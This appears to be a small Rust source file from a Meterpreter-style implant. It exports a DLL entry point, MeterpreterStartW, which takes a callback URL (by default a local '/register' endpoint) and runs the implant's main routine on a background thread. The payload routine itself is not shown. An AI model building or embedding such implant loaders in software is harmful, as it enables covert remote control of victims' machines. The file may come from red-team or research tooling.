use std::thread;

pub fn run(url: &str) -> u32 {
    super::exe::run(url)
}

#[unsafe(no_mangle)]
pub extern "system" fn MeterpreterStartW(url_w: *const u16) -> u32 {
    let url = unsafe {
        if url_w.is_null() {
            "http://127.0.0.1:8080/register".to_string()
        } else {
            let mut len = 0usize;
            while *url_w.add(len) != 0 {
                len += 1;
            }
            let slice = std::slice::from_raw_parts(url_w, len);
            String::from_utf16_lossy(slice)
        }
    };

    thread::spawn(move || {
        let _ = run(&url);
    });

    0
}
